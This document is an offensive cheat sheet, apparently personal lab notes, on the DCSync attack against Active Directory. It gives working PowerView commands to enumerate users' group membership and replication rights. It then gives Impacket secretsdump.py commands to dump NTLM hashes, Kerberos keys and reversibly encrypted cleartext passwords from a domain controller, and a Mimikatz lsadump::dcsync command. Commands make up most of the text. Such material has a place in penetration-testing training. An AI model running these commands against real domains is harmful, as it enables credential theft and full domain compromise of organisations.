# What is DCSync
Consist in stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, who is used by the Domain Controllers to replicate data from the domain. 
This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
To do that we have to request a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right.

wemust have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). 
Domain/Enterprise Admins and default domain administrators have this right by default.

## 1 Get-DomainUser to View user's Group Membership
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -Identity UserName  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
output :
samaccountname     : USERNAME
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1048
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=mydomain,DC=LOCAL, CN=Shared Calendar
                     ...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```
## 2 Get-ObjectAcl to Check user's Replication Rights
```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1048"
Get-ObjectAcl "DC=mydomain,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
If we had the perfect right over the user, such as WriteDacl, we can also add this privilege to a user under our control, execute the DCSync attack...
DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacketâ€™s secretsdump.py.

## 3 Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py (Remotly)
```powershell
secretsdump.py -outputfile mydomain_hashes -just-dc MYDOMAIN/UserName@192.168.0.1
# -just-dc-ntlm if we only want NTLM hashes or specify.
# -just-dc-user <USERNAME> to only extract data for a specific user.
# -pwd-last-set to see when each account's password was last changed.
# -history if we want to dump password history.
# -user-status to check and see if a user is disabled.
``` 

## Reversible Encryption Password Storage Set
### Enumerating Further using Get-ADUser to see if Encryption Password Storage is used
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
cat inlanefreight_hashes.ntds.cleartext 
```

## Performing the Attack with Mimikatz (localy)
```powershell
# before :
Import-Module .\PowerView.ps1
Convert-NameToSid UserName
.\mimikatz.exe
lsadump::dcsync /domain:MYDOMAIN.LOCAL /user:UserName
```















